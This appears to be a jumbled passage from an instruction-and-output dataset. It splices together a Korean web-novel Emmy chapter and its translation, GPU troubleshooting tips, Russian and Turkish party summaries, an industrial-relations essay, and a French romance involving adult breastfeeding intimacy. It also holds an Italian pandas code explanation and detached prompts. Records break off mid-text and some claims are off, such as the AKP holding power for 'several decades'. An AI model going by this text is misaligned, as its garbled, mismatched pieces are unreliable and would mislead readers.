-짝짝짝짝짝짝짝짝!! 수만 명이 몰린 관객석에서 박수가 광광 울렸다. 반쯤은 일어나 강우진을 보며 박수쳤다. 기립박수는 ‘이로운 악’ 팀 역시 같았다. -짝짝짝짝짝짝짝짝짝!! 마일리 카라, 화린 외의 배우들이 기쁨의 웃음을 참지 못했다. “우진씨!! 우진씨!! 진짜 축하드려요!” “굉장해!!! 당신이 해냈어요!!” “우와!! 아니! 와- 우진씨 축하합니다!!” 턱수염 송만우 PD는 스륵 일어난 강우진을 얼싸안았고. “하하하! 그래!! 이거지!! 이렇게 돼야지!! 축하해요, 우진씨!!” 뒤에서 박수치는 최나나 작가는 눈가에 눈물이 맺혔다. ‘이로운 악’ 팀 전체가 방방 뛰었다. 그 주변의 관객들 역시 기립박수로 우진을 축하했다. 방송팀, 생중계 카메라가 축하받는 강우진을 메인으로 찍었다. ”…“ 네이비 턱시도의 강우진은 무던한 얼굴로. -스윽. 여배우들이 선 거대한 무대 쪽으로 걸었다. 자리가 가까워서 무대까지는 금방이었다. 어느새 무대 위로 오른 우진이 노란 드레스의 여배우에게 트로피를 받았다. 순간, 방송팀 카메라 중 한 개가 다른 후보 배우들을 찍었다. 무표정 으로 박수치는 민머리 매튜 메이저스. 억지의 분위기가 강했다. 그러거나 말거나 무대 위 강우진은. ”…\\" 중앙 스텐딩 마이크 앞에 섰다. 웅웅 울리던 음악이 꺼졌다. 떠나가라 터지던 박수도 잦아들었다. 수만 관객이 그만을 응시했다. 우진이 한 손에 든 금빛 트로피를 내려봤다. 구 형태를 받드는 날개 달린 여자의 모습. 잠시간 트로피 를 무심히 내려보던 강우진이 고개를 들었다. 그리곤 수만 외국인 관객을 향해 입을 열었다. ‘에미상’ 최초로 남우주연상을 탄, 금빛 트로피를 들어 올린 한국배우의 첫 마디였다. 물론, 영어였다. “이제 '아카데미상’만 남았습니다.” < 에미 (4) > 끝","output":"< Emmy (4) > Watching the back of bald-headed Matthew, Kang Woo-jin had a stern face but inwardly heaved a sigh of relief. \\"What's with that guy? He's got some serious presence.\\" Then he turned his head toward the blonde-haired Kara. \\"Let's go.\\" Kara, with a slight smile mixed in, followed and opened her mouth. \\"Pretty bold, aren't you? Matthew has quite the influence around here, so even I tend to avoid him.\\" Oh, really? I had no idea. Woo-jin had roughly thought that in Hollywood, Matthew's influence was on par with that of Shin Han-ho. Soon, Woo-jin, who was about to naturally respond with his concept act, changed his words. He had already confessed to her, so he thought it might be okay to show a bit of his true self, little by little. Kang Woo-jin whispered to Kara. \\"To be honest, I was a bit scared.\\" \\"...Really?\\" \\"Yes.\\" \\"You didn't look it at all?\\" Kara, with her blue eyes, gazed at Woo-jin and then her smile deepened. \\"Are you saying that to reassure me? You don't have to. I'm not that close with Matthew.\\" \\"...\\" Why does the ending jump out like that? Kang Woo-jin thought it would take a while for these massive misunderstandings and misconceptions to unravel. Around this time. \\"Oh! Mr. Kang Woo-jin!!\\" A man with a high-tension perm waved his hands vigorously at Woo-jin. He was about the same age as Kang Woo-jin. \\"Hahaha, I wanted to meet you!\\" \\"...Hello.\\" \\"Your red carpet performance was also amazing! Let's be Insta friends!\\" Who are you? The man was vaguely familiar. The answer, once again, was whispered by Kara. \\"Billy Brown, you know, he's also a nominee like you.\\" A nominee for the Best Actor award, just like Matthew. However, the temperature difference in how they treated Woo-jin was stark. If Matthew was an iceberg, this one was a blazing fire. Afterwards, Kang Woo-jin had to encounter several actors. Especially, he met all the male lead actor nominees for the drama category. \\"They're more friendly than I thought.\\" Except for Matthew, the other two treated Kang Woo-jin quite warmly. Anyway. \\"Woo-jin! Miley! Over here!!\\" \\"Haha, Mr. Woo-jin. You've finally appeared as 'Jang Yeon-woo'?\\" \\"I enjoyed your red carpet performance!\\" \\"Wow- Miley, your dress is really pretty??\\" The 'Beneficial Evil' team greeted Kang Woo-jin and Kara, who had arrived at their seats, with great enthusiasm. Producer Song Man-woo, writer Choi Na-na, Hwarin, Ha Gang-su, and other actors, the nominated key staff, and Kim So-hyang, the general director, and other Netflix Korea employees were all dressed up in tuxedos, suits, and dresses. After a brief exchange of greetings, Hwarin, who was wearing a beige dress and had met her favorite for the first time in a while, glanced at Kang Woo-jin, who was close to Kara, and furrowed her brow. Naturally, no one noticed. 'Why are they so close?' Hwarin, who had cleared her throat, whispered to Kang Woo-jin. Her fangirl fighting spirit was soaring. \\"Mr. Woo-jin, it feels like it's been a long time. But what was that on the red carpet?\\" \\"You'll know when you see the movie later.\\" Seeing this, Miley Kara also kept a smile on her face, but inside she was constantly bothered by Hwarin. '...That actress, the one Kang Woo-jin saved first. What, she's too cute? And yet subtly sexy.' Somehow, the entire 'Beneficial Evil' team had gathered. Their seats were a bit in front of the center, facing the stage. A foreigner who seemed to be a producer from the broadcasting team pointed at the 'Beneficial Evil' team with his index finger. \\"Start with them for the angle.\\" Several cameras captured the 'Beneficial Evil' team. The live broadcast team did the same. After all, 'Beneficial Evil' was probably the hottest thing at this year's 'Emmys'. It had maintained the number one spot on Netflix worldwide for over two months. Of course. \\"The main focus is Kang Woo-jin, center the shots around him.\\" The protagonist was Kang Woo-jin. A little later. Suddenly, the hall, which was filled with tens of thousands of seats, was so packed with spectators that there were no empty seats visible. The entire hall was buzzing with impressive figures. Everyone was engaged in their own conversations. At that moment. -♫♪ Quite lively music played, and the lighting in the hall brightened several times and turned slightly blue. Additionally, the giant stage was also lit up. The same was true for the large 'Emmy' trophy statue. The 'EMMYs' letters on the monitors attached to either side of the statue began to spin. Then. -Swish. A tall black man in a suit, who looked a bit like Joseph Felton but wasn't, took to the stage. He was actor and comedian Bradley Morgan, known for his wit, and Morgan was hosting the entire 'Emmys' this year. Standing alone on the giant stage, even with tens of thousands of spectators in front of him, he said: \\"Nice to meet you- oh, I'm already tired.\\" He started the proceedings as if throwing a joke, without any sign of nervousness. \\"I've been given the great task of hosting the 'Emmys'. Hmm- to be honest, it was a bit bothersome, you know? The 'Emmys' are famous for being long! I wanted to watch the 'Emmys' while drinking beer at home!\\" Laughter spread among the tens of thousands of spectators. Then, host Bradley Morgan suddenly changed the topic. \\"What can we do, we're here so let's do it. Let's see. This year's 'Emmys' had a lot of incredible things, right? Among them, 'Beneficial Evil' definitely stood out. I enjoyed it too. And Mr. Kang Woo-jin! Your red carpet performance was the best!\\" Suddenly, the broadcast team's cameras all focused on the 'Beneficial Evil' team, and Kang Woo-jin, with his indifferent expression, was also captured in the angle. Of course, by the live broadcast cameras as well. Bradley started with 'Beneficial Evil' and heated up the atmosphere by mentioning other works and actors. And then. \\"Alright- let's start this year's 'Primetime Emmys!\\" With his declaration. -♫♪ Lively music played throughout the hall again. The lights brightened and dimmed repeatedly. The sound of tens of thousands of spectators clapping was also mixed in. The live broadcast chat soared like crazy. Soon, host Bradley announced the first award. \\"The first award is for Art Direction in a Drama Series!\\" As his shout ended, the works were displayed on the giant monitors on either side of the trophy statue on the stage. There were a total of five works, and among them was. -[Netflix/Beneficial Evil S1] Part 1 of 'Beneficial Evil' was included. It was the only Korean work among the five. Then, a male and female Hollywood actor took to the big stage. The female actor held a cue card with 'EMMYS' written on it. \\"Hello, it's an honor to be presenting the first award at the 'Emmys'.\\" After a brief greeting, the female actor among the two opened the sealed cue card. The 'Emmys' hall, filled with tens of thousands of spectators, quieted down for a moment, and the female actor, after seeing the cue card, smiled slightly and shouted into the standing microphone. \\"Congratulations on the Emmy for Art Direction in a Drama Series! 'Beneficial Evil!!\\" 'Beneficial Evil' was called first. Once again, all cameras captured the 'Beneficial Evil' team. -♬♪ Music played along with the applause of tens of thousands of spectators. Then, two people from the 'Beneficial Evil' team stood up. They were the key staff in charge of art direction. The two, with widened eyes, received congratulations. Producer Song Man-woo, writer Choi Na-na, and everyone else gave a standing ovation. Kang Woo-jin did the same. The two key staff members in art direction. \\"Is it true?! Really??!\\" They climbed onto the giant stage with faces that seemed to be in a dream. Amidst the applause, the 'Emmys' trophy was handed to the two key staff members. The female staff member went to the standing microphone first. \\"...Uh- thank you so much. Ah, um. First of all, I love my parents so much. Our team worked so hard. Also- ah, I don't know what to do? I can't remember!\\" She showed a visibly flustered appearance. She was the lesser of two embarrassments. The male staff member that followed even teared up. Regardless, it was a historic moment as a Korean work was called at the 'Emmys' for the first time, and the heated atmosphere continued as the award ceremony moved on to the next category. Costume Design, Casting, and a total of three awards were presented. -♫♪ Likewise, a thunderous applause poured out for the winning teams, but the 'Beneficial Evil' team was not among them. Next was. \\"Music Composition for a Drama Series!\\" It was for the music award, and the 'Beneficial Evil' team was included, but. \\"The Emmy for Music Composition in a Drama Series! 'White Man'!!\\" Unfortunately, it was a miss. However, in the following award. \\"Stunt Performance Award! 'Beneficial Evil!! Congratulations!!\\" 'Beneficial Evil' was called again. The Stunt Performance Award was essentially the action award. Producer Song Man-woo and the entire team clenched their fists. They had high hopes for the action category, if nothing else. \\"That's it!!\\" Kang Woo-jin's action had amazed the world. And somehow, 'Beneficial Evil' had already achieved two wins at the 'Emmys'. It broke the atmosphere that winning even one award would be a big deal. However, the next award for which 'Beneficial Evil' was nominated, the Special Effects Award, was again a miss. Around this time. -Swish. Host Bradley Morgan, standing on one side of the giant stage, spoke into the microphone. \\"Next up are the actors, right? Let's start with the Supporting Actor category in the drama series.\\" Suddenly, the atmosphere shifted from the staff to the actors who shone in the works. It started with the Supporting Actor award. Unfortunately, 'Beneficial Evil' was not included in the Supporting Actor category. Other works' Hollywood actors filled the stage. They were supporting actors from a Netflix work in the US and from the foreign broadcasting channel HOB. After each actor's acceptance speech, host Bradley Morgan took to the stage with a smile. \\"The atmosphere is heating up, and it seems like it's going to get even hotter. Now it's time for the Lead Actor category in the drama series. We'll start with the Lead Actor award.\\" From this point on, the 'Emmys' broadcast team and the live broadcast team were busy. The murmuring of tens of thousands of spectators also grew several times louder. \\"Finally. This is one of the big events of this 'Emmys', isn't it?\\" \\"Ah, Kang Woo-jin? Hmm- his momentum is scary, but... it's difficult to win the Lead Actor award in one go, isn't it? If he had come through the Supporting Actor category, maybe.\\" \\"I think the same. He achieved a miracle at Cannes, but the 'Emmys' are more stubborn than Cannes.\\" \\"That's true, but he's also too inexperienced. He's already won two awards, and that's impressive enough.\\" Directors, actors, producers, officials, etc. Kang Woo-jin's name was being tossed around by numerous people. \\"Honestly, Kang Woo-jin's energy is impressive. I enjoyed 'Beneficial Evil' too. But still, in terms of acting quality, isn't Matthew Majors a step above?\\" \\"It seems that way, but- I don't know. Lately, I find Matthew's acting a bit boring.\\" \\"Boring?\\" \\"With that level of experience, you should feel an energy that captivates you, rather than just feeling that the acting is good. But it's always the same atmosphere, you know?\\" \\"Is Kang Woo-jin different?\\" \\"When I see his acting... I don't know. It just feels like the character itself is frolicking around.\\" \\"Are you saying Kang Woo-jin will win the Lead Actor award?\\" \\"I hope so, but considering many factors, the 'Emmys' are less likely.\\" Suddenly, the 'Emmys' live broadcast angle showed Kang Woo-jin, who was sitting with crossed legs and no big change in expression, quietly. The chat was filled with comments like \\"Why is he so calm?\\" but in reality, Kang Woo-jin's heart was pounding at this moment. \\"Wow- crazy, wait a minute. Why does it feel different from Cannes??\\" There could be many reasons, but the biggest one was, of course, that this place was the vast Hollywood, and it was Hollywood's 'Emmys'. What stopped his heartbeats was the two actresses who had suddenly taken to the stage. One wore a yellow dress, the other a pink dress. The one holding the cue card was the one in the pink dress. \\"I'm nervous to be presenting the Lead Actor award.\\" The two actresses finished a brief conversation and then announced the nominees. The actors were displayed on the giant stage monitor. Not their real appearances, but their characters from the works. Starting with bald-headed Matthew Majors, whom he had encountered earlier, to curly-haired Billy Brown, and others. And at the very end. -[Netflix/Beneficial Evil S1/Kang Woo-jin] Kang Woo-jin, who played 'Jang Yeon-woo', was displayed. He was the first Korean or Asian actor to be nominated for the 'Emmys' Lead Actor award. Then the actress in the pink dress opened the cue card. \\"The 'Emmys' drama category, Lead Actor award goes to-\\" Suddenly, the cameras captured the nominated actors. The last was Kang Woo-jin. Around this time, Miley Kara, who was sitting behind Woo-jin, glanced at the back of his head. \\"'Beneficial Evil' has a good flow, already two wins. The issue aspect must have been included in the evaluation. There's a chance. But still - the 'Emmys' have a long tradition and they dislike change. I wonder how it will turn out...\\" At this moment, prayers filled the world watching the 'Emmys' live broadcast. Especially in Korea. \\"Please! Please!! Please!!!\\" \\"Our Woo-jin! Let it be Woo-jin!\\" \\"Oppa will do it! He will! He has to! Right?\\" Kang Woo-jin's family, Hong Hye-yeon, Ryu Jung-min, and everyone who knew him held their breath and hoped. \\"If Mr. Woo-jin wins- no, he must win. Ah! Why am I so nervous!\\" \\"Be quiet! Everyone is praying, don't startle them!\\" Perhaps. No, 100% of Korea was hoping. They all wished for the foreign actress on stage to call out Kang Woo-jin's name. Then. -Swish. The live broadcast showed the actress holding the cue card, and she also. \\"Oh!\\" Smiled broadly. \\"The 'Emmys' drama category Lead Actor award goes to-\\" And then she shouted the name as if the stage was about to fly away. \\"Beneficial Evil!!! Kang! Woo! Jin!!\\" The two actresses on stage clapped excessively. \\"Wow!!\\" \\"Congratulations!!\\" -♫♪ Music exploded. -Clap clap clap clap clap clap clap clap!! Tens of thousands of spectators in the audience clapped thunderously. Half of them stood up and clapped looking at Kang Woo-jin. The standing ovation was the same for the 'Beneficial Evil' team. -Clap clap clap clap clap clap clap clap clap!! Miley Kara, Hwarin, and the other actors couldn't contain their joyous laughter. \\"Mr. Woo-jin!! Mr. Woo-jin!! Congratulations for real!\\" \\"Amazing!!! You did it!!\\" \\"Wow!! No! Wow- Congratulations, Mr. Woo-jin!!\\" Bearded producer Song Man-woo hugged the rising Kang Woo-jin. \\"Hahaha! That's right!! This is how it should be!! Congratulations, Mr. Woo-jin!!\\" Writer Choi Na-na, clapping from behind, had tears in her eyes. The entire 'Beneficial Evil' team was jumping with joy. The surrounding audience also congratulated Woo-jin with a standing ovation. The broadcast team, live broadcast cameras focused on Kang Woo-jin being congratulated. \\"...\\" Kang Woo-jin, in his navy tuxedo, with a calm face. -Swish. Walked toward the giant stage where the actresses were. It didn't take long to reach the stage as his seat was close. Soon, Woo-jin, who had climbed onto the stage, received the trophy from the actress in the yellow dress. For a moment, one of the broadcast cameras captured the other nominated actors. Bald-headed Matthew Majors clapped with an expressionless face. The forced atmosphere was strong. Regardless, Kang Woo-jin on stage. \\"...\\" Stood in front of the central standing microphone. The rumbling music stopped. The thunderous applause also subsided. Tens of thousands of spectators gazed only at him. Woo-jin looked down at the golden trophy in one hand. The shape of a woman with wings supporting a globe. For a brief moment, Kang Woo-jin, who had been looking down at the trophy indifferently, raised his head. Then he opened his mouth toward the tens of thousands of foreign spectators.

However, it can often be fixed by going through the following troubleshooting steps: 1. **Check your Power Settings**: Make sure that your computer is set to High Performance mode. On Windows, you can do this by going to Control Panel > Power Options and selecting 'High Performance.' 2. **Update your GPU drivers**: Make sure you have the latest drivers for your graphics card. Visit the manufacturer's website (NVIDIA, AMD, or Intel) to download and install the latest driver. 3. **Check for CPU Bottleneck**: If your CPU is at 100% usage and your GPU is not, you may be experiencing a CPU bottleneck. This means that your CPU isn't fast enough to keep up with your GPU, leading to low GPU utilization. You might need to upgrade your CPU or close background applications to alleviate this. 4. **Game Settings**: Sometimes, game settings are not properly utilizing the GPU. Make sure that the graphics settings in your game are set high enough to put a proper load on the GPU. If the settings are too low, the GPU won't have enough work to do. 5. **VSync and Frame Rate Caps**: Enabling Vertical Sync (VSync) can limit your GPU's performance to match the refresh rate of your monitor, which might be lowering its utilization. Similarly, if you have set a frame rate cap in your game or control panel that is easily achievable, it might be stopping your GPU from working harder. 6. **Check for Thermal Throttling**: Your GPU may be overheating, causing it to throttle down to reduce temperature. Monitor the temperatures using software like HWMonitor or MSI Afterburner. If temperatures are too high (>85°C), clean your PC from dust, improve airflow, or consider replacing your thermal paste. 7. **Troubleshoot Other Hardware**: Make sure other hardware in your system is not malfunctioning. Faulty RAM, overheating CPUs, or a failing power supply can affect GPU performance. 8. **Graphics Card Settings**: Go to your graphics card control panel (e.g., NVIDIA Control Panel or AMD Radeon Settings) and ensure that the power management mode is set to prefer maximum performance. 9. **Background Processes**: Close unnecessary background applications which could be using CPU cycles, thereby limiting the amount of work your GPU can do. 10. **Run in Fullscreen Mode**: Running a game in windowed or borderless windowed mode can sometimes lead to lower GPU utilization compared to running it in fullscreen mode. 11. **Disable Integrated Graphics**: If your system has both integrated and dedicated GPUs, ensure that your games run using the dedicated GPU. You might need to set this in the BIOS/UEFI, or in the graphics control panel. 12. **Check for Malware**: Sometimes malware can consume system resources in the background, leading to reduced performance. Run a full system scan with your antivirus software. If none of these steps resolve the issue, it might be worth seeking assistance from the game's support community, the manufacturer's customer service, or considering that the game may just be poorly optimized and there's not much you can do to improve GPU usage."},{"instruction":"Придумай короткий анекдот про то, что Надеждина не допустили в кандидаты в президенты РФ в 2024 году и Верховный Суд отказал в удовлетворении искового заявления.

It aimed to represent the interests of those who favored economic liberalism, democracy, and the integration of Russia into the Western world. Key political ideologies and principles of the Union of Right Forces included: 1. Economic liberalism: The party advocated for free market principles, seeking to limit state intervention in the economy, promote privatization, and create favorable conditions for entrepreneurship and business development. 2. Rule of law and democracy: SPS championed democratic governance, respect for human rights, independent judiciary, and the rule of law as foundational for Russia's development. 3. Pro-Western orientation: The party sought closer ties with Europe and the United States, embracing integration with Western structures like the European Union and NATO. 4. Political reforms: It called for political reforms to ensure fair elections, freedom of the press, and to combat corruption within the government. 5. Modernization: The drive towards modernizing the Russian economy and society was a key component of the SPS agenda, focusing on scientific and technological advancement. 6. National security: Though the party was pro-Western, it also emphasized the importance of a strong Russian state capable of ensuring national security and protecting its interests on the global stage. In the later years of its existence, internal divisions and competition from other parties led to the decline of the Union of Right Forces. Its successor can be considered the \\"Right Cause\\" party (Pravoye Delo), although it has not achieved significant success in Russian politics.

At its core, industrial relations is concerned with the complex interactions between employers and employees (or their representatives), and also with the involvement of the state in regulating these relations. The concept and nature of industrial relations can be discussed under several themes: 1. **Employment Relationship**: This is the central subject of industrial relations, focusing on the relationships between employers and their workforce. It examines the bargaining processes, communication, cooperation, and sometimes conflict that occur as employers and employees pursue their respective interests. 2. **Collective Bargaining**: Industrial relations involves the processes by which unions and employers negotiate wages, working hours, work conditions, and benefits. Collective bargaining is a key aspect of industrial relations that aims to achieve fair and just terms of employment through collective agreements. 3. **Labor Unions and Management**: The role of labor unions in representing workers’ interests in discussions with management is a fundamental part of industrial relations. Conversely, from the perspective of management, the aim may be to maximize productivity and profitability while maintaining a stable and satisfied workforce. 4. **Labor Laws and Regulations**: Governments enact labor laws and regulations to ensure fair treatment of workers, set minimum wage levels, regulate working hours, protect against unemployment, and prevent discrimination. Industrial relations study how these laws affect the behavior of employers and employees and shape the employment landscape. 5. **Conflict Resolution**: Industrial relations also involve the mechanisms for resolving disputes between employers and employees. Arbitration, mediation, and conciliation are methods used to resolve conflicts without resorting to industrial actions like strikes or lockouts. 6. **Power Dynamics and Interests**: In any employment relationship, there is an inherent power imbalance between the employer and the individual employee. Industrial relations explore how this power is distributed and the way in which various interest groups, including labor and management, interact and negotiate to protect and advance their interests. 7. **Globalization and Changing Work Patterns**: With increasing globalization, industrial relations also examine the effects of global trade, offshoring, outsourcing, and the movement of labor across borders. The changing nature of work, such as the rise of the gig economy and remote work, also significantly impacts industrial relations. 8. **Human Resource Management (HRM)**: Although related to industrial relations, HRM focuses more on the recruitment, development, and management of individual employees, whereas industrial relations typically deals with collective aspects and the relationships between groups such as labor unions and employer associations. 9. **Social Justice and Equity**: Industrial relations also have a social dimension, addressing issues of social justice, equity, and diversity in the workplace. This encompasses fair treatment for all workers, including marginalized groups, and efforts to eliminate discrimination and inequality. 10. **Industrial Democracy**: This concept deals with the participation of employees in the decision-making process of an organization. It promotes the idea that workers should have a voice in the operation and governance of their places of employment. The nature of industrial relations is inherently dynamic, evolving with changes in the economy, societal values, technology, and the balance of power between labor and capital. As such, the field is continuously adapting to address new challenges and trends within the world of work."},{"instruction":"Explain the issues of technological change in IR-Employment","output":"Technological change has always had a significant impact on industrial relations, particularly in the field of employment. These changes can lead to shifts in work practices, the demand for different skills, changes in employment levels, and can affect the overall balance of power between employers and employees. Here are several key issues concerning technological change in industrial relations with a focus on employment: 1. **Job Displacement**: Advancements in technology can lead to automation, where machines or software replace human labor. This can result in job displacement, as certain tasks become automated. Workers in industries with a high potential for automation, such as manufacturing, transportation, and administrative roles, may face job losses and may need to seek employment in other sectors. 2. **Job Creation**: While technology can displace jobs, it also has the potential to create new ones. The demand for workers with skills in technology-related fields, such as software development, data analysis, and cybersecurity, has been on the rise. The challenge lies in matching the skills of displaced workers to the needs of emerging jobs, which often requires retraining and education. 3. **Skill Gaps and Training**: As technology evolves, there is an increasing need for workers to acquire new skills. This creates a demand for training and lifelong learning to ensure that the workforce can adapt to technological advancements. Industrial relations must address who is responsible for providing and funding such training, whether it should be employers, individuals, or the government. 4. **Wage and Income Inequality**: Technological change can exacerbate wage and income inequalities, as high-skill workers may benefit disproportionately compared to low-skill workers. This may lead to tensions and demands for measures to address the resulting disparities through wage policies, social benefits, or other interventions. 5. **Changes in Work Patterns**: Technology enables new forms of work, such as remote work, gig work, and flexible working arrangements. These changes can lead to challenges in traditional industrial relations, as standard full-time employment contracts become less prevalent, thereby affecting labor protections, benefits, and job security. 6. **Workers' Representation and Bargaining Power**: As the nature of work changes, traditional forms of labor representation, such as unions, may find it challenging to organize workers who are spread out or engaged in non-traditional employment. This can weaken collective bargaining power and reduce the effectiveness of labor unions in advocating for workers' rights. 7. **Health and Safety**: Technological advancements can lead to improvements in health and safety conditions in the workplace. However, they may also introduce new risks, such as those related to ergonomic issues in highly automated environments or new forms of stress associated with constant connectivity. 8. **Work-Life Balance**: The blurring of boundaries between work and personal life, particularly with the prevalence of mobile technology and remote work, raises questions about the right to disconnect, mental health, and the need for regulations to address these concerns. 9. **Regulatory Challenges**: The speed of technological change often outpaces the development of regulations, resulting in a regulatory lag. Industrial relations must grapple with the challenge of creating laws and policies that protect workers without stifling innovation. 10. **Employee Monitoring and Privacy**: Technological advancements have made it easier for employers to monitor their employees. This raises concerns about privacy rights and the extent to which monitoring is acceptable, which can be a point of contention between employees and employers. Addressing these issues requires a collaborative effort among stakeholders, including employers, employees, unions, governments, and educational institutions. The goal is to balance the benefits of technological change with the protection and advancement of workers' rights, while also ensuring economic competitiveness and innovation."},{"instruction":"(In the main Azur Lane base…) Enterprise: “Nice to see all the nations getting along, huh?” Belfast: “Indeed, Lady Enterprise.

Elle était devenue mère célibataire à la suite d'une relation houleuse qui s'était achevée peu avant la naissance de sa petite fille, Léa. La petite créature, tout juste âgée de quelques semaines, était la prunelle de ses yeux et le centre de son univers, et pourtant, l'allaitement se transformait en un combat quotidien. Chaque tentative pour nourrir sa fille naturellement finissait dans le découragement. Léa, inexplicablement, refusait obstinément de prendre le sein, laissant Aurélie avec une poitrine douloureusement engorgée, symbole physique des difficultés de sa nouvelle réalité de mère. Les visites régulières de la sage-femme avaient offert quelques conseils pratiques, mais rien ne semblait faire effet. Face à l'insistance de Léa à rejeter l'allaitement, Aurélie dut se résoudre à l'utilisation de biberons, un choix déchirant pour elle qui avait tant rêvé de ce lien unique que pouvait tisser l'allaitement. Chaque cri de Léa, chaque froncement de sourcil lorsqu'elle approchait son sein, était comme une petite défaite personnelle, un échec maternel que personne, y compris elle-même, ne pouvait comprendre. C'est dans ce contexte particulièrement pénible qu'Emma, la babysitter qu'elle avait engagée pour l'aider à jumeler retour au travail et soins à Léa, prit place dans la vie d'Aurélie. Emma était le genre de personne qui abordait la vie avec une aisance et une confiance qui forçaient l'admiration. Dès son arrivée, elle avait su faire rire Léa et, chose plus étonnante encore, réussir à la calmer lors de ses crises de larmes. Elle devint rapidement un pilier dans le quotidien chaotique d'Aurélie. Un soir, alors que Léa s'était finalement endormie et qu'Aurélie, éreintée, laissait échapper des larmes de fatigue et de douleur devant sa poitrine tendue et douloureuse, Emma proposa une solution pour le moins inattendue. Ses mots, empreints d'une sincère volonté d'aider, étaient cependant remplis d'une audace troublante : elle lui offrit de téter son lait pour la soulager de son engorgement. L'embarras initial fut palpable, mais face à l'évidence de sa souffrance, Aurélie accepta. Ce furent d'abord des moments de pur pragmatisme, des instants fonctionnels où toutes deux focalisaient sur le soulagement physique d'Aurélie. Pourtant, au fil des séances, une intimité particulière commença à naître entre elles. Le regard d'Emma, plein de compassion et d'un soutien sans jugement, enveloppait Aurélie d'un sentiment de sécurité et de compréhension qu'elle n'avait jamais ressenti auparavant. Les gestes timides se transformèrent en étreintes, les silences gênés en conversations murmurées à l'oreille, partageant rêves et inquiétudes au son des respirations apaisées. Dans cet échange singulier, Aurélie trouva non seulement le soulagement face à la douleur physique, mais aussi un réconfort émotionnel inattendu. Les mois passèrent, et Léa grandit en même temps que les sentiments entre Aurélie et Emma s'épanouirent. Ce qui avait débuté par un acte de dépannage inhabituel se mue en un sentiment plus profond, une affection tendre et sincère qui colorait désormais leurs interactions bien au-delà des moments d'intimité initialement partagés dans l'urgence. Un jour, lorsqu'Aurélie se rendit compte que son bien-être ne dépendait plus seulement du confort physique que lui apportait Emma, mais également de sa présence réconfortante et affectueuse, les deux femmes prirent conscience que, ensemble, elles avaient noué une relation d'une douceur remarquable. La douleur de l'engorgement avait laissé place à une histoire d'amour tissée doucement, au rythme des battements de deux cœurs ayant trouvé un écho l'un en l'autre. Un amour s'était éveillé entre les couches, les biberons et les rires de Léa, promettant à Aurélie non seulement une compagne de vie, mais aussi une partenaire pour partager les défis et les joies de la maternité."},{"instruction":"(In the main Azur Lane base…) Enterprise: “Nice to see all the nations getting along, huh?” Belfast: “Indeed, Lady Enterprise.

Founded in 2001 by a group led by Recep Tayyip Erdoğan, it has roots in conservative democratic and Islamist factions. While the AKP's political position has shifted throughout its time in power, the following ideologies have generally been associated with it: 1. **Conservatism**: The AKP has a significant conservative base, emphasizing traditional family values, social cohesion, and moral standards aligned with Sunni Islam. 2. **Islamism**: Initially, the AKP was labelled as a moderate Islamist party, advocating for a greater role for Islam in public life while still maintaining the secular framework of the Turkish state. Over time, the party has avoided the Islamist label, preferring terms like conservative democratic, but religious elements still feature prominently in its platform. The degree to which Islam informs their policies has been a subject of debate and criticism. 3. **Economic Liberalism**: The AKP has pursued neoliberal economic policies, promoting privatization, foreign investment, and deregulation. Overall, they have supported free-market principles, although this has sometimes been mixed with more interventionist state action. 4. **Populism**: Erdoğan's leadership has been noted for its populist rhetoric, appealing to the common people and often framing politics as a struggle between 'the elite' and 'the people'. The party's approach to governance often reflects a majoritarian view of democracy, where the will of the majority has priority over minority rights. 5. **Nationalism**: While originally more oriented towards integration with the European Union and advocating for minority rights (including those of Kurds), in recent years, the AKP has adopted a more nationalist stance, emphasizing Turkish identity and sovereignty. 6. **Authoritarianism**: Critics allege that under the AKP, there has been an erosion of democratic norms and civil liberties in Turkey, with concentration of power in the executive, weakening of the judiciary and press freedoms, and crackdowns on political dissent. It is important to note that political ideologies are fluid and can adapt to changing circumstances. The AKP's policies and platform have evolved, and its membership encompasses a range of views. Moreover, as the party has been in power for several decades, it has been exposed to numerous domestic and international challenges that have influenced its ideological stance."},{"instruction":"(In the main Azur Lane base…) Enterprise: “Nice to see all the nations getting along, huh?” Belfast: “Indeed, Lady Enterprise.

In dettaglio, ecco cosa fa ogni parte: - \`one_year = series['1990']\` - Questo potrebbe estrarre una partizione del DataFrame \`series\` che corrisponde all'anno 1990. - \`one_year_groups = one_year.groupby(Grouper(freq='ME'))\` - Questa linea raggruppa i dati in \`one_year\` per la fine di ogni mese (ME sta per month end). Il ciclo \`for\` successivo itera attraverso questi gruppi mensili: - \`for name, group in one_year_groups:\` itera attraverso i gruppi risultanti. - \`months_np=group.to_numpy()\` - Questa linea converte ogni gruppo mensile in un array numpy. Successivamente, c'è un secondo ciclo \`for\` che itera fino a 31 (il numero massimo di giorni in un mese), e utilizza \`np.append()\`: - \`for i in range(len(months_np),31):\` - Imposta l'iterazione a partire dalla lunghezza dell'array \`months_np\` fino a 31. - \`months_np= np.append(months_np,-1)\` - Aggiunge il valore -1 all'array \`months_np\` per ogni iterazione del ciclo. Questo viene fatto perché l'autore del codice sta probabilmente cercando di standardizzare la lunghezza di tutti gli array mensili a 31 elementi, in modo che possano essere disposti in una matrice in cui ogni riga rappresenta un mese e ogni colonna un giorno. Ogni mese che non ha 31 giorni viene riempito con -1 fino a raggiungere 31 elementi, che potrebbe essere interpretato come un valore mancante o un segnaposto nella heatmap. \`list_month.append(months_np)\` - Dopo aver eventualmente espanso ogni array mensile a 31 elementi, viene aggiunto alla lista \`list_month\`, che alla fine conterrà 12 array (uno per ogni mese), ciascuno di 31 elementi. \`matrix=np.asmatrix(list_month)\` - Questa linea converte la lista di array in una matrice numpy. \`dimensions = np.shape(matrix)\` - Calcola le dimensioni (shape) della matrice (che saranno 12 righe per 31 colonne, se si presuppone che ci sia un gruppo per ciascuno dei 12 mesi). \`print(dimensions)\` - Stampa le dimensioni della matrice. \`sns.heatmap(matrix, cmap='coolwarm')\` - Infine, il codice utilizza seaborn per tracciare una heatmap di questa matrice, con un particolare schema di colori. Il parametro \`-1\` in \`np.append()\` è utilizzato come valore di riempimento per i giorni in cui il dato non è presente e serve per mantenere la matrice di dimensione uniforme, ovvero che tutte le righe (mesi) abbiano lo stesso numero di colonne (giorni). Ciò è importante per visualizzare i dati su una heatmap dove ogni cella rappresenta un giorno in un determinato mese."},{"instruction":"spiega meglio il range e il -1","output":"Certamente! La funzione \`range\` in Python è usata per generare un insieme di numeri che seguono una sequenza. Nell'utilizzo dato nel codice: \`\`\`python for i in range(len(months_np), 31): \`\`\` \`range(len(months_np), 31)\` crea una sequenza di numeri che inizia dal valore \`len(months_np)\` (la lunghezza dell'array \`months_np\`) e finisce a \`30\`, che è un numero inferiore a \`31\` perché il limite 